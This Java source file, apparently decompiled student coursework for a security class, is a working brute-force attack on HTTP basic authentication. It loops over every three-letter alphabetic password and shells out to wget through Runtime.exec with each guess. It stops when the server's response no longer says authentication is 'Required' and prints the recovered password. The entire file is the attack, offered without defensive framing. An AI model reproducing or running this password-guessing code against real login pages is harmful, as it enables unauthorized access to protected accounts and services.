public class BruteForce {
    public BruteForce() {
        super();
    }
    public static void main ( String[] a ) {
        String s = new String();
        String s0 = BruteForce.m00();
        System.out.println ( new StringBuilder().append ( "Password is: " ).append ( s0 ).toString() );
    }
    public static String m00() {
        String s = new String();
        char[] a = "AAA".toCharArray();
        Runtime a0 = Runtime.getRuntime();
        System.out.println ( " attacking....." );
        int i = 65;
        while ( i <= 122 ) {
            int i0 = ( char ) i;
            a[0] = ( char ) i0;
            int i1 = 65;
            while ( i1 <= 122 ) {
                int i2 = ( char ) i1;
                a[1] = ( char ) i2;
                int i3 = 65;
                while ( i3 <= 122 ) {
                    int i4 = ( char ) i3;
                    a[2] = ( char ) i4;
                    String s0 = new String ( a );
                    String s1 = new StringBuilder().append ( "wget --http-user= --http-passwd=" ).append ( s0 ).append ( " http://sec-crack.cs.rmit.edu./SEC/2/index.php " ).toString();
                    label0: {
                        label1: try {
                            java.io.BufferedReader a1 = new java.io.BufferedReader ( ( java.io.Reader ) new java.io.InputStreamReader ( a0.exec ( s1 ).getErrorStream() ) );
                            String s2 = a1.readLine();
                            {
                                if ( s2 == null ) {
                                    break label0;
                                }
                                boolean b = true;
                                while ( true ) {
                                    String s3 = a1.readLine();
                                    if ( s3 == null ) {
                                        break;
                                    }
                                    if ( s3.endsWith ( "Required" ) ) {
                                        b = false;
                                    }
                                }
                                if ( b ) {
                                    break label1;
                                }
                            }
                            break label0;
                        } catch ( Exception a2 ) {
                            a2.getMessage();
                            break label0;
                        }
                        return s0;
                    }
                    if ( i3 == 90 ) {
                        i3 = 96;
                    }
                    a0.gc();
                    i3 = i3 + 1;
                }
                if ( i1 == 90 ) {
                    i1 = 96;
                }
                i1 = i1 + 1;
            }
            if ( i == 90 ) {
                i = 96;
            }
            i = i + 1;
        }
        return "not found";
    }
}
